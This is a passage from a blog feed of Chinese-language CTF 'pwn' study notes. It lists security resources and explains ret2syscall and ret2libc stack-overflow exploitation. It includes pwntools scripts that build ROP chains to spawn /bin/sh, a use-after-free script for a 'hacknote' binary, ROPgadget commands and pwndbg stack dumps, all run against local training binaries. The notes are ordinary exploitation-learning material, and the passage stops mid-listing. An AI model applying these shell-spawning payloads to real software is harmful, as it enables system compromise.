解密解码工具</p>\n<p><a href=\"https://cloudconvert.com/\">https://cloudconvert.com</a> 在线格式转换</p>\n<p><a href=\"https://web.archive.org/\">https://web.archive.org</a> 查看历史网站记录 </p>\n<p><a href=\"https://cloudconvert.com/\">https://cloudconvert.com</a>  各种文件的格式转换</p>\n<p><a href=\"https://www.ilovepdf.com/\">https://www.ilovepdf.com</a>  pdf操作，切割等</p>\n<h3 id=\"ctf导航\"><a href=\"#ctf导航\" class=\"headerlink\" title=\"ctf导航\"></a>ctf导航</h3><p><a href=\"http://www.ctfiot.com/\">http://www.ctfiot.com</a>. ChaMd5团队做的</p>\n<p><a href=\"https://ctf.mzy0.com/\">https://ctf.mzy0.com</a></p>\n<h2 id=\"特定漏洞相关资源\"><a href=\"#特定漏洞相关资源\" class=\"headerlink\" title=\"特定漏洞相关资源\"></a>特定漏洞相关资源</h2><h3 id=\"堆\"><a href=\"#堆\" class=\"headerlink\" title=\"堆\"></a>堆</h3><p>how2heap(github)</p>\n<p><a href=\"https://bbs.kanxue.com/thread-272416.htm#msg_header_h1_2\">https://bbs.kanxue.com/thread-272416.htm#msg_header_h1_2</a></p>\n<h2 id=\"待整理资源\"><a href=\"#待整理资源\" class=\"headerlink\" title=\"待整理资源\"></a>待整理资源</h2><p><a href=\"https://blog.csdn.net/Breeze_CAT/article/details/103788631\">https://blog.csdn.net/Breeze_CAT/article/details/103788631</a></p>\n<h1 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h1><p>查看系统调用</p>\n<p><a href=\"https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl\">https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl</a></p>\n<p>系统调用参考\\查看系统调用参数</p>\n<p><a href=\"https://syscalls64.paolostivanin.com/\">https://syscalls64.paolostivanin.com</a></p>\n<p><a href=\"https://elixir.bootlin.com/linux/v5.19/C/ident/getname\">https://elixir.bootlin.com/linux/v5.19/C/ident/getname</a></p>\n<p>macbook 快捷键</p>\n<p><a href=\"http://dragon-li.gitee.io/my-wiki/doc/mac/005-Mac%E4%B8%8BIterm2%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%BF%AB%E6%8D%B7%E9%94%AE.html\">http://dragon-li.gitee.io/my-wiki/doc/mac/005-Mac下Iterm2使用及快捷键.html</a></p>\n<p>解题模版</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.arch=<span class=\"string\">&#x27;amd64&#x27;</span> //</span><br><span class=\"line\"></span><br><span class=\"line\">sh = process(<span class=\"string\">&quot;./ret2syscall&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">gdb.attach(sh,<span class=\"string\">&quot;break *0x8048e96&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">binsh = <span class=\"number\">0x080BE408</span></span><br><span class=\"line\">edxecxebx = <span class=\"number\">0x0806eb90</span></span><br><span class=\"line\">eaxret = <span class=\"number\">0x080bb196</span></span><br><span class=\"line\">int80 = <span class=\"number\">0x08049421</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*(<span class=\"number\">108</span> + <span class=\"number\">4</span>) + p32(eaxret)  + p32(<span class=\"number\">0xb</span>) + p32(edxecxebx) + p32(<span class=\"number\">0</span>) + p32(<span class=\"number\">0</span>) + p32(<span class=\"number\">0x080BE408</span>)+p32(int80)</span><br><span class=\"line\">  </span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.arch=<span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./hacknote&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">length,context</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;choice&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;size&quot;</span>,<span class=\"built_in\">str</span>(length))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Content&quot;</span>,context)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;choice&quot;</span>,<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Index&quot;</span>,<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Print</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;choice&quot;</span>,<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Index&quot;</span>,<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">16</span>,<span class=\"string\">&quot;aaa&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">16</span>,<span class=\"string\">&quot;bbb&quot;</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">add(<span class=\"number\">8</span>,p32(<span class=\"number\">0x08048986</span>))</span><br><span class=\"line\">Print(<span class=\"number\">0</span>)</span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"><span class=\"comment\">#io.recv(1024)</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>libc版本问题,需要换一下</p>\n<p>2.27</p>\n<p>[DEBUG] Received 0x29 bytes:<br>    b’free(): double free detected in tcache 2\\n’</p>\n",
            "tags": []
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-9-%E6%A0%88%E6%BA%A2%E5%87%BAret2%E7%B3%BB%E5%88%97/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-9-%E6%A0%88%E6%BA%A2%E5%87%BAret2%E7%B3%BB%E5%88%97/",
            "title": "pwn入门-9-栈溢出ret2系列",
            "date_published": "2023-02-18T07:10:56.000Z",
            "content_html": "<p>这部分主要来源于ctf-wiki</p>\n<h1 id=\"ret2syscall\"><a href=\"#ret2syscall\" class=\"headerlink\" title=\"ret2syscall\"></a>ret2syscall</h1><p>​\t\t这个其实就是利用了系统调用(syscall), 什么是系统调用呢? 参看基础知识篇,这里没有system了,但是不影响getshell,因为system的底层是调用的execve系统调用,我们只需要找到gadget,来构造系统调用,调用execve,然后传入参数&#x2F;bin&#x2F;sh,即可. 即 execve(“&#x2F;bin&#x2F;sh”)</p>\n<p>​\t\t针对系统调用还有很多其他的利用方法,比如经典的ROW,就是说如果我们不能够执行execve getshell的话,我们可以想办法读取flag,毕竟我们的目的就是拿到flag,可以进行read open write将flag写入一个地方,然后打印出来即可.(后面再写相关的)</p>\n<p>​\t\t这里我们利用的是 execve(“&#x2F;bin&#x2F;sh”,NULL,NULL),<font color=\"red\">系统调用的参数不是根据那个调用约定了.  不用栈传参了,都需要用到寄存器</font>eax ebx ecx edx 分别存放 系统调用号和第 1 2 3 个参数, 所以他们的值分别为 0xb &#x2F;bin&#x2F;sh 0 0 , .rodata:080BE408 aBinSh          db ‘&#x2F;bin&#x2F;sh’,0  这个地址里存放着&#x2F;bin&#x2F;sh</p>\n<p>buf 108 + 4 ebp + retaddress </p>\n<h2 id=\"寻找gadget\"><a href=\"#寻找gadget\" class=\"headerlink\" title=\"寻找gadget\"></a>寻找gadget</h2><p>​\t\t要找到int 0x80 gadget,以及那几个pop, 利用ROPgadget ,具体语句及结果如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ROPgadget --binary rop  --only <span class=\"string\">&#x27;pop|ret&#x27;</span> | grep <span class=\"string\">&#x27;eax&#x27;</span> </span><br><span class=\"line\">ROPgadget --binary ret2syscall  --only <span class=\"string\">&#x27;int&#x27;</span></span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"number\">0x0806eb90</span> : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class=\"line\"><span class=\"number\">0x080bb196</span> : pop eax ; ret  </span><br><span class=\"line\"><span class=\"number\">0x08049421</span> : <span class=\"type\">int</span> <span class=\"number\">0x80</span></span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><p>所以payload构造如下<br>binsh &#x3D; 0x080BE408<br>edxecxebx &#x3D; 0x0806eb90<br>eaxret &#x3D; 0x080bb196<br>int80 &#x3D; 0x08049421<br>payload &#x3D; b”a”*(108 + 4) + p32(eaxret)  + p32(0xb) + p32(edxecxebx) + p32(0) + p32(0) + p32(0x080BE408) + p32(int80)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">sh = process(<span class=\"string\">&quot;./ret2syscall&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">gdb.attach(sh,<span class=\"string\">&quot;break *0x8048e96&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">binsh = <span class=\"number\">0x080BE408</span></span><br><span class=\"line\">edxecxebx = <span class=\"number\">0x0806eb90</span></span><br><span class=\"line\">eaxret = <span class=\"number\">0x080bb196</span></span><br><span class=\"line\">int80 = <span class=\"number\">0x08049421</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*(<span class=\"number\">108</span> + <span class=\"number\">4</span>) + p32(eaxret)  + p32(<span class=\"number\">0xb</span>) + p32(edxecxebx) + p32(<span class=\"number\">0</span>) + p32(<span class=\"number\">0</span>) + p32(<span class=\"number\">0x080BE408</span>)+p32(int80)</span><br><span class=\"line\">  </span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<p>关于esp和ret的关系,ret后esp怎么移动等,需要再看看</p>\n<p>Pop 一次后, esp往高地址移动一个地址</p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-9-%E6%A0%88%E6%BA%A2%E5%87%BAret2%E7%B3%BB%E5%88%97/image-20230218192128330.png\" alt=\"image-20230218192128330\" style=\"zoom: 33%;\">\n\n\n\n<p>为什么ret后就到了栈的下一个地址???</p>\n<p>ret的时候, esp就指向了返回地址那一行,执行完pop后,esp移动到下一个gadget,然后ret弹出这个gadget的地址,作为下一条指令,由此一步步跟进</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-9-%E6%A0%88%E6%BA%A2%E5%87%BAret2%E7%B3%BB%E5%88%97/image-20230218192552976.png\" alt=\"image-20230218192552976\"></p>\n<h1 id=\"ret2libc\"><a href=\"#ret2libc\" class=\"headerlink\" title=\"ret2libc\"></a>ret2libc</h1><p>​\t\t执行libc中的函数,一个关键点是找对libc版本.</p>\n<p>​\t\t通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)(它们的关系???????)</p>\n<h2 id=\"re2libc1\"><a href=\"#re2libc1\" class=\"headerlink\" title=\"re2libc1\"></a>re2libc1</h2><p>​\t\t反汇编代码</p>\n<p>​\t\t先从它自身寻找system和&#x2F;bin&#x2F;sh</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ROPgadget --binary ret2libc1 --<span class=\"built_in\">string</span> <span class=\"string\">&#x27;/bin/sh&#x27;</span>  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"number\">0x08048720</span> : /bin/sh</span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\"># objdump -d ret2libc1 | grep <span class=\"string\">&quot;system&quot;</span></span></span><br><span class=\"line\"><span class=\"number\">08048460</span> &lt;system@plt&gt;:</span><br><span class=\"line\"><span class=\"number\">8048611</span>:\te8 <span class=\"number\">4</span>a fe ff ff       \tcall   <span class=\"number\">8048460</span> &lt;system@plt&gt;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t其活了,就覆盖返回地址为system,然后给它传参就好了,问题是怎么传参呢?栈的结构是怎样的?</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-9-%E6%A0%88%E6%BA%A2%E5%87%BAret2%E7%B3%BB%E5%88%97/image-20230220094904834.png\" alt=\"image-20230220094904834\"></p>\n<p>​\t\t当走到返回地址这里时,进入call system,就相当于新调用了一个函数,</p>\n<p>​\t\t说实话这里还是不太懂流程,<font color=\"red\">不过最好的办法就是自己去调试! </font></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">► <span class=\"number\">0xf7e4c623</span> &lt;gets+<span class=\"number\">291</span>&gt;    push   ecx                           &lt;_IO_2_1_stdin_&gt;</span><br><span class=\"line\">  <span class=\"number\">0xf7e4c624</span> &lt;gets+<span class=\"number\">292</span>&gt;    call   __uflow                    &lt;__uflow&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"number\">0xf7e4c629</span> &lt;gets+<span class=\"number\">297</span>&gt;    add    esp, <span class=\"number\">0x10</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t在返回到system时,栈的结构就是这样子的了,符合上图..但也没啥…还是看书把..参见下面一章节</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│ esp <span class=\"number\">0xffffd4e0</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">01</span>:<span class=\"number\">0004</span>│     <span class=\"number\">0xffffd4e4</span> —▸ <span class=\"number\">0x8048720</span> ◂— das     <span class=\"comment\">/* &#x27;/bin/sh&#x27; */</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t找到了俩地址之外,还要找好偏移,找偏移有很多种方法</p>\n<p>​\t\t&#x2F;&#x2F; [sp+1Ch] [bp-64h]@1 这个可以吗?  </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">和pwn入门<span class=\"number\">-1</span>-初识里面的例子一样,eax作为字符串的开始地址,一直往上走到ebp,所以可以在gets这里下断点,输入一些a,然后查看栈的布局即可</span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"number\">0x8048677</span>  &lt;main+<span class=\"number\">95</span>&gt;                  lea    eax, [esp + <span class=\"number\">0x1c</span>]</span><br><span class=\"line\"><span class=\"number\">0x804867b</span>  &lt;main+<span class=\"number\">99</span>&gt;                  mov    dword ptr [esp], eax</span><br><span class=\"line\"><span class=\"number\">0x804867e</span>  &lt;main+<span class=\"number\">102</span>&gt;                 call   gets@plt                     &lt;gets@plt&gt;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">pwndbg&gt; <span class=\"built_in\">stack</span></span><br><span class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│ esp <span class=\"number\">0xffffd540</span> —▸ <span class=\"number\">0xffffd55c</span> ◂— <span class=\"string\">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span></span><br><span class=\"line\"><span class=\"number\">01</span>:<span class=\"number\">0004</span>│     <span class=\"number\">0xffffd544</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">02</span>:<span class=\"number\">0008</span>│     <span class=\"number\">0xffffd548</span> ◂— <span class=\"number\">0x1</span></span><br><span class=\"line\"><span class=\"number\">03</span>:<span class=\"number\">000</span>c│     <span class=\"number\">0xffffd54c</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">04</span>:<span class=\"number\">0010</span>│     <span class=\"number\">0xffffd550</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">05</span>:<span class=\"number\">0014</span>│     <span class=\"number\">0xffffd554</span> ◂— <span class=\"number\">0x2c307d</span> <span class=\"comment\">/* &#x27;&#125;0,&#x27; */</span></span><br><span class=\"line\"><span class=\"number\">06</span>:<span class=\"number\">0018</span>│     <span class=\"number\">0xffffd558</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">07</span>:<span class=\"number\">001</span>c│ eax <span class=\"number\">0xffffd55c</span> ◂— <span class=\"string\">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span></span><br><span class=\"line\">pwndbg&gt;</span><br><span class=\"line\"><span class=\"number\">08</span>:<span class=\"number\">0020</span>│  <span class=\"number\">0xffffd560</span> ◂— <span class=\"string\">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span></span><br><span class=\"line\">... ↓     <span class=\"number\">7</span> skipped</span><br><span class=\"line\">pwndbg&gt;</span><br><span class=\"line\"><span class=\"number\">10</span>:<span class=\"number\">0040</span>│  <span class=\"number\">0xffffd580</span> ◂— <span class=\"string\">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span></span><br><span class=\"line\">... ↓     <span class=\"number\">7</span> skipped</span><br><span class=\"line\">pwndbg&gt;</span><br><span class=\"line\"><span class=\"number\">18</span>:<span class=\"number\">0060</span>│  <span class=\"number\">0xffffd5a0</span> ◂— <span class=\"string\">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span></span><br><span class=\"line\">... ↓     <span class=\"number\">7</span> skipped</span><br><span class=\"line\">pwndbg&gt;</span><br><span class=\"line\"><span class=\"number\">20</span>:<span class=\"number\">0080</span>│     <span class=\"number\">0xffffd5c0</span> ◂— <span class=\"string\">&#x27;aaaaaaaa&#x27;</span></span><br><span class=\"line\"><span class=\"number\">21</span>:<span class=\"number\">0084</span>│     <span class=\"number\">0xffffd5c4</span> ◂— <span class=\"string\">&#x27;aaaa&#x27;</span></span><br><span class=\"line\"><span class=\"number\">22</span>:<span class=\"number\">0088</span>│ ebp <span class=\"number\">0xffffd5c8</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">23</span>:<span class=\"number\">008</span>c│     <span class=\"number\">0xffffd5cc</span> —▸ <span class=\"number\">0xf7dfdfa1</span> (__libc_start_main+<span class=\"number\">241</span>) ◂— add    esp, <span class=\"number\">0x10</span></span><br><span class=\"line\"><span class=\"number\">24</span>:<span class=\"number\">0090</span>│     <span class=\"number\">0xffffd5d0</span> ◂— <span class=\"number\">0x1</span></span><br><span class=\"line\">   </span><br></pre></td></tr></table></figure>\n\n<p>​\t\t上述例子中输入了108个a,所以缓冲区是108,然后ebp占4位,然后就是返回地址了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">sh  = process(<span class=\"string\">&quot;./ret2libc1&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">binsh = <span class=\"number\">0x08048720</span></span><br><span class=\"line\">system = <span class=\"number\">0x08048460</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">112</span> + p32(system) + <span class=\"string\">b&quot;b&quot;</span>*<span class=\"number\">4</span> + p32(binsh) </span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t</p>\n<p>​\t</p>\n<h2 id=\"函数调用、序言与后记\"><a href=\"#函数调用、序言与后记\" class=\"headerlink\" title=\"函数调用、序言与后记\"></a>函数调用、序言与后记</h2><p>​\t《计算机安全导论深度实践》p99.</p>\n<h3 id=\"函数调用\"><a href=\"#函数调用\" class=\"headerlink\" title=\"函数调用\"></a>函数调用</h3><p>​\t\t为什么system后面是exit(就是返回地址),这是因为正常情况下,我们在call 一个函数的时候,也就是<font color=\"red\">一个函数被调用的时候,会把它的返回地址压入栈中</font>,等返回的时候取用,但是我们这里不是正常的call,而是直接覆盖掉了返回地址,所以就没有压栈的那个操作了,<font color=\"red\">所以需要我们手动把返回地址写入里面</font>. 此时push 返回地址进去后,esp就是下面序言的a状态</p>\n<h3 id=\"序言\"><a href=\"#序言\" class=\"headerlink\" title=\"序言\"></a>序言</h3><p>​\t\t序言就是函数开头处的代码,用于为函数准备栈和指针. IA-32(32位x86)体系结构中,序言内设指令为enter,具体是下面三条指令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pushl %ebp  //保存调用者的ebp值(用于被调用函数结束后,恢复之前调用函数的栈帧)</span><br><span class=\"line\">movl %esp, %ebp //把esp赋值给ebp,这样ebp就到了 被调用函数的栈帧了</span><br><span class=\"line\">subl %N, %esp  //给局部变量开辟一块空间</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-9-%E6%A0%88%E6%BA%A2%E5%87%BAret2%E7%B3%BB%E5%88%97/image-20230220103110353.png\" alt=\"image-20230220103110353\"></p>\n<h3 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h3><p>​\t\t\t函数末尾处的代码,用于恢复栈和寄存器到函数调用之前的状态. IA-32(32位x86)体系结构中,后记内设指令是leave,具体内容是下面三条指令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">movl %ebp, %esp //把ebp的值赋值给esp,释放掉开辟的栈空间</span><br><span class=\"line\">popl %ebp  //让ebp指回调用者函数的栈帧</span><br><span class=\"line\">ret        //返回  ret包含了两条指令,pop 和 jump(参上)</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-9-%E6%A0%88%E6%BA%A2%E5%87%BAret2%E7%B3%BB%E5%88%97/image-20230220103140222.png\" alt=\"image-20230220103140222\"></p>\n<h3 id=\"示例\"><a href=\"#示例\" class=\"headerlink\" title=\"示例\"></a>示例</h3><p>​\t\t示例程序</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">foo</span><span class=\"params\">(<span class=\"type\">int</span> x)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> a;</span><br><span class=\"line\">        a = x;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">bar</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> b=<span class=\"number\">5</span>;</span><br><span class=\"line\">        foo(b);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\tgcc -m32 -S prog.c 编译成汇编代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">foo:</span><br><span class=\"line\">\tpushl\t%ebp</span><br><span 